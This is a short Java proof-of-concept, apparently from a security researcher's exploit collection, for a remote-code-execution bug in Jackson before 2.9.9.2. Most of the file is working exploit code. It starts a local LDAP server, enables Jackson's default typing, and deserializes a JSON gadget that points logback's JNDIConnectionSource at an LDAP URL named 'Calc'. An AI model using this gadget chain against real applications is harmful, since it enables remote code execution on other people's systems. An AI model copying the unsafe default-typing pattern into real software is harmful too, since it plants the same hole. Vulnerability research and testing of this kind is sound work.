package com.threedr3am.bug.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.server.LdapServer;
import com.threedr3am.bug.server.RmiServer;
import java.io.IOException;

/**
 * logback jndi rce
 * jackson < 2.9.9.2
 * @author threedr3am
 */
public class LogbackJndi {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {

    String json = "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://localhost:43658/Calc\"}]";
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);
  }
}
